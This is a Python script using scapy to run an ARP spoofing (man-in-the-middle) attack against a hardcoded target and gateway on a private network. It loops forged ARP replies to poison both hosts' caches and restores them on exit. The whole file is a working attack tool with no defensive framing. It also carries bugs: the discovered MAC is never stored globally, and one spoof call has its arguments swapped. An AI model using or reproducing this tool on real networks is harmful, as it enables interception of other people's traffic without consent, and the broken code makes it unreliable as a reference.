import scapy.all as scapy
import time 

targetMac = None
targetIP = "10.100.102.12"
getwayIP = "10.100.102.1"

def getVictimMac(ip):
    arpRequest = scapy.ARP(pdst =ip) 
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast =         broadcast/arpRequest
    arpReply,hi= scapy.srp(arpRequestBroadcast, timeout = 3, verbose = False)
    if arpReply:
        return arpReply[0][1].src
    else:
        return None
 
def spoof(targetIP,targetMac,spoofIP):
    spoofArpPacket = scapy.ARP(pdst = targetIP,hwdst = targetMac, psrc = spoofIP,op = "is-at") 
    scapy.send(spoofArpPacket, verbose = False)

def waitUntilMacFound():
    targetMac = getVictimMac(targetIP)
    while not targetMac:
        targetMac = getVictimMac(targetIP)
        if not targetMac:
            print("mac address wasnt found for this target\n")
    print("The mac address is: " + targetMac)


def restore(destination_ip,source_ip):
    destinationMac = getVictimMac(destination_ip)
    sourceMac = getVictimMac(source_ip)
    packet = scapy.ARP(pdst = destination_ip, hwdst =destinationMac,psrc = source_ip,hwsrc = sourceMac,op = "is-at")
    scapy.send(packet, verbose = False)

def main():
    waitUntilMacFound()
    try:
        sent_packets_count = 0 
        while True:
            spoof(targetIP, targetMac,getwayIP)
            spoof(getwayIP, targetIP,targetMac)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="") 
            time.sleep(2)

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting") 
        restore(getwayIP, targetIP)
        restore(targetIP, getwayIP)
        print("[+] Arp Spoof Stopped\n") 
if __name__ == "__main__":
    main()